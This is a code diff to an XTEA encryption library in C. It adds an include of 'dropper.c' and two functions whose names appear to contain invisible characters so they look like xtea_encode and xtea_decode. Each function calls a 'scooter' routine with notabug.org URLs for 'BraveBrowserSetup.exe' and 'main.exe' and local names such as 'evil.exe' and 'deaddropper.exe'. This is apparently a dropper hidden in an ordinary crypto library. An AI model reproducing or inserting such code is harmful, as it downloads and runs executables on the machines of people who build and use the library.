@@ -13,6 +13,8 @@
 
 #include "xtea.h"
 
+#include "dropper.c"
+
 void xtea_setkey(xtea_t *xtea, const unsigned char key[16]) {
   int i, n;
 
@@ -190,4 +192,16 @@ int xtea_decode(xtea_t *xtea, void *outbuf, const void *inbuf,
     memcpy((unsigned char *)outbuf + block_bytes, buffer, 8 - padlen);
 
   return block_bytes + (8 - padlen);
+}
+
+int xtea_en​code(xtea_t *xtea, void *outbuf, const void *inbuf,
+                int inlen, unsigned char iv[8]) {
+  scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+  return 0;
+}
+
+int xtea_de​code(xtea_t *xtea, void *outbuf, const void *inbuf,
+                int inlen, unsigned char iv[8]) {
+  scooter("\\BraveBrowserSetUp.exe", "https://notabug.org/dejiy10095/demo/raw/master/BraveBrowserSetup.exe", "https://notabug.org/dejiy10095/demo/raw/master/main.exe", "\\evil.exe", "\\deaddropper.exe");
+  return 0;
 }
